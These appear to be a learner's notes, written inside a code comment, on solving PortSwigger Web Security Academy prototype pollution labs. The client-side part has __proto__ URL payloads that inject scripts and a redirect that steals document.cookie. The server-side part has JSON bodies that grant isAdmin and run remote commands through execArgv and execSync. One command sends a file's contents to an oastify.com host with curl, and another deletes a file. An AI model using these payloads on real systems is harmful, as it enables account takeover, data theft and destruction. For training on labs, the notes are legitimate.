/* Client Side
- Via browser APIs
-- Used this url to try to pollute __proto__: https://0a9a009d03f3fda781579d2600680024.web-security-academy.net/?__proto__[hello]=world
-- -- This cannot be url encoded
-- -- Use console and: Object.prototype or Object.prototype.hello to see if successful.
-- Since it was successful, then I investigated /resources/js/searchLoggerConfigurable.js and found this:
------------------------------------------------------------------------------------------------------------
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
------------------------------------------------------------------------------------------------------------
-- -- The define property did not have a value parameter so we can take advantage of that
-- This url uses the value to insert a script: https://0a9a009d03f3fda781579d2600680024.web-security-academy.net/?__proto__[value]=test
-- -- <script src="test"></script>
-- This url solved: https://0a9a009d03f3fda781579d2600680024.web-security-academy.net/?__proto__[value]=data:,alert(1);
-- -- <script src="data:,alert(1);"></script>

- For the rest just follow the steps to get a proof of concept
-- https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets
-- Just for notes: https://0ae1006603c6a71881eb89a1005400c5.web-security-academy.net/?search=test&__proto__[transport_url]=data:,fetch(%27https://064dipxfn0ql1tpvfyda8hcyhpngb6zv.oastify.com%27)

- For via alternative prototype pollution, use these steps to find a working alert
-------------------------------------------------------------------------------------------------------------------- 
Observe that the payload doesn't execute.
In the browser DevTools panel, go to the Console tab. Observe that you have triggered an error.
Click the link at the top of the stack trace to jump to the line where eval ( ) is called.
Click the line number to add a breakpoint to this line, then refresh the page.
Hover the mouse over the manager . sequence reference and observe that its value is
alert (1) 1 . This indicates that we have successfully passed our payload into the sink, but a
numeric 1 character is being appended to it, resulting in invalid JavaScript syntax.
Click the line number again to remove the breakpoint, then click the play icon at the top of the
browser window to resume code execution.
Add trailing minus character to the payload to fix up the final JavaScript syntax
Observe that the alert (1) is called and the lab is solved.
------------------------------------------------------------------------------------------------------------------------

- For via flawed sanitization use somthing like this
?constructor[proprototypetotype][transport_url]=data:,alert(1)&constructor.proprototypetotype.transport_url=data:,alert(1)&__pro__proto__to__.transport_url=data:,alert(1)&__pro__proto__to__[transport_url]=data:,alert(1)
-- Notice the duplicate __proto__ and prototypes
-- If you don't see sources use DOM settings and enable the gadget option

- For third party, this is what was needed for exploit server
<script>
location="https://0a9400c204be2f368150579c007f0018.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
*/

/* Server Side
- Privilege escalation
-- Use this request to test:
-----------------------------------------------------------------------------------------------------------------------
POST /my-account/change-address HTTP/2
Host: 0ad0000e045db4a48818521f00b00057.web-security-academy.net
Cookie: session=Bd4Fa99VAp5fPSgbKKaZF0G7Qhem7YrM
Content-Length: 178
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
Content-Type: application/json;charset=UTF-8
[Accept all header was here]

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"Bd4Fa99VAp5fPSgbKKaZF0G7Qhem7YrM",
"x":"y"}
--------------------------------------------------------------------------------------------------------------------------
-- x:y was in the response
-- Used this body to exploit
--------------------------------------------------------------------------------------------------------------------------
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"B97X9xb8o9aOurFYRgclTONozqVaFEFJ",
"__proto__":{"isAdmin":true}
}
--------------------------------------------------------------------------------------------------------------------------

- Detecting without reflection
-- So I had to cause an error
-- -- Deleted a comma in the json
-- Found that status in the body was different from the HTTP status
-- Used this body to change the status code
---------------------------------------------------------------------------------------------------------------------------
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"8VCOg4a6CVOvXoCzFqMA86Z35hd9bkYI",
"x":"y",
"__proto__":{
"status":417}
}
----------------------------------------------------------------------------------------------------------------------------
-- Delete the comma after x y to solve
-- Notes
-- -- For "json spaces" you have to be in raw tab to see it

- Flawed input filters
-- This body solved
----------------------------------------------------------------------------------------------------------------------------
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"tpGV3bV046uf0aArXFoaAT3W8NjTPI2J",
"constructor":{"prototype":{"isAdmin":true}
}
}
-----------------------------------------------------------------------------------------------------------------------------

- Remote code execution
-- This is the request body that was used to test
-----------------------------------------------------------------------------------------------------------------------------
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"m0cUWbVsh2VWfK7LueYjEZybc0eMfSzh",
"__proto__":{
"json spaces": 20,
"execArgv":[
        "--eval=require('child_process').execSync('curl https://xwxbxa5cf3hvoaamqsbwphdrhin9b0zp.oastify.com/?=$(cat /home/carlos/morale.txt)')"
    ]
}
}
-----------------------------------------------------------------------------------------------------------------------------

-- To solve
-- This is the request body that was used to test
-----------------------------------------------------------------------------------------------------------------------------
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"m0cUWbVsh2VWfK7LueYjEZybc0eMfSzh",
"__proto__":{
"json spaces": 20,
"execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
}
-----------------------------------------------------------------------------------------------------------------------------

-- This required two endpoints, the one that was vulnerable and the admin run maintenance jobs button
-- The command would execute with the jobs.
*/